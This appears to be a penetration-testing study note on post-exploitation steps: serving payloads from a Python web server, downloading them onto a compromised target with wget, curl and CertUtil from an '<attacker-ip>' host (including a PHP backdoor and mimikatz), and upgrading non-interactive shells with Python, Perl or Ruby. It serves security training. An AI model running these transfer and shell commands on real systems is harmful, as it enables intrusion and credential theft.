# üìÇ Transferring Files To Target Systems

---

## üéØ Objective

After obtaining **initial access** to a target system, transferring additional tools or payloads (like privilege escalation scripts or exploits) is often necessary.
In many cases, especially when **Meterpreter** is not available, you‚Äôll need to use **built-in OS utilities** to upload or download files.

This process typically involves a **two-step approach**:

1. **Host** the required files on your own web server.
2. **Download** those files from the target system using native tools.

---

## üåê Setting Up a Web Server With Python

### üí° Overview

Python provides a lightweight HTTP server module ‚Äî perfect for quickly hosting files without needing Apache or Nginx.

---

### ‚öôÔ∏è For Python 2

```bash
python -m SimpleHTTPServer 80
```

or

```bash
python -m SimpleHTTPServer 443
```

* Starts an HTTP server in the **current directory**
* Displays logs for **GET** and **404** requests
* Serves files over port `80` (or `443` if needed)

---

### ‚öôÔ∏è For Python 3

```bash
python3 -m http.server 8080
```

* Uses the `http.server` module (Python 3 replacement for `SimpleHTTPServer`)
* By default, binds to `0.0.0.0` (all interfaces) and port `8080`

---

### üß† Example Workflow

1. Move your payloads to a directory:

   ```bash
   cd /home/user/payloads
   ```
2. Start a web server:

   ```bash
   python3 -m http.server 8080
   ```
3. On the target machine, download the file:

   * Using `wget` (Linux):

     ```bash
     wget http://<attacker-ip>:8080/php-backdoor.php
     ```
   * Using `curl`:

     ```bash
     curl -O http://<attacker-ip>:8080/linpeas.sh
     ```

---

## ü™™ File Transfer on Windows ‚Äì `certutil`

Windows systems have a native utility called **CertUtil**, which can be abused to download remote files ‚Äî very useful when PowerShell or external tools are disabled.

```bash
CertUtil -urlcache -f http://<attacker-ip>/mimikatz.exe mimikatz.exe
```

* `-urlcache` tells CertUtil to handle remote file URLs
* `-f` forces the download even if cached
* Saves the file locally as `mimikatz.exe`

‚úÖ **Tip:** You can use this method to download *any* file type ‚Äî scripts, binaries, or tools.

---

## üß© File Transfer on Linux

If you‚Äôre on a Linux target:

```bash
wget http://<attacker-ip>/php-backdoor.php
```

or

```bash
curl -O http://<attacker-ip>/payload.sh
```

> üí° If `wget` or `curl` are missing, check `/usr/bin/` or `/bin/` for similar tools, or use `nc` (Netcat) for raw transfers.

---

# üíª Upgrading Non-Interactive Shells

---

## ‚öôÔ∏è What Is a Non-Interactive Shell?

A **non-interactive shell** doesn‚Äôt provide:

* Prompt display (`user@host:~$`)
* Command history
* Line editing or tab completion
* Ability to run full interactive commands like `su`, `nano`, or `ssh`

This often happens when you exploit a web app or gain a reverse shell.

---

## üîß Methods to Upgrade the Shell

### üß± 1. Basic Upgrade Using Bash

```bash
/bin/bash -i
```

If **Bash** is available, this gives a basic interactive session.

If Bash is not installed, check available shells:

```bash
cat /etc/shells
```

You may see:

```
/bin/bash
/bin/sh
/bin/dash
```

If only `/bin/sh` exists:

```bash
/bin/sh
```

> ‚ö†Ô∏è `/bin/sh` is simpler and less feature-rich but still usable for most tasks.

---

### üêç 2. Upgrading Using Python

If Python is installed, spawn a **PTY (pseudo-terminal)** for a fully interactive session.

```bash
python --version          # Check if Python 2 is present
python3 --version         # Or Python 3

# For Python 2
python -c 'import pty; pty.spawn("/bin/bash")'

# For Python 3
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

‚úÖ Enables line editing, tab completion, and colored output.

---

### üß¨ 3. Using Perl or Ruby

If **Perl** is installed:

```bash
perl --help
perl -e 'exec "/bin/bash";'
```

If **Ruby** is available:

```bash
ruby -e 'exec "/bin/bash"'
```

> üß† These scripting languages invoke a subshell process with interactive capabilities.

---

## üå± Setting Environment Variables

After obtaining an interactive shell, the environment might be misconfigured.
You‚Äôll often notice commands like `ls`, `wget`, or `clear` don‚Äôt work properly ‚Äî this happens when **PATH**, **TERM**, or **SHELL** variables are not defined.

---

### üß© Commands to Fix the Environment

```bash
env
```

Check the current environment variables. If the `PATH` is missing or incomplete:

```bash
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
export TERM=xterm
export SHELL=bash
```

---

### üìò Why Set These Variables?

| Variable | Purpose                                                        | Effect                                                   |
| -------- | -------------------------------------------------------------- | -------------------------------------------------------- |
| `PATH`   | Defines directories where executable binaries are searched for | Without it, commands like `ls` or `wget` may fail        |
| `TERM`   | Defines terminal type                                          | Enables proper text formatting, colors, and key bindings |
| `SHELL`  | Defines the user‚Äôs default shell                               | Ensures commands like `su` or subshells behave correctly |

> üí° Setting these variables **stabilizes your session** and allows you to use utilities seamlessly.

---

### ‚úÖ Verify Shell Stability

After exporting the variables, test:

```bash
ls -alps
wget
clear
history
```

If these commands now behave normally, your shell is successfully upgraded and stabilized.

---

## üß© Summary

| Task                  | Tool/Command                                                  | Description                                   |
| --------------------- | ------------------------------------------------------------- | --------------------------------------------- |
| Host files            | `python3 -m http.server 8080`                                 | Quick web server to share payloads            |
| Windows file transfer | `CertUtil -urlcache -f <URL>`                                 | Download files using Windows built-in utility |
| Linux file transfer   | `wget` or `curl`                                              | Fetch remote files to target system           |
| Upgrade shell         | `/bin/bash -i`, `python -c 'pty.spawn'`, `perl -e`, `ruby -e` | Convert basic shell into interactive          |
| Fix environment       | `export PATH`, `TERM`, `SHELL`                                | Ensure usability of common commands           |


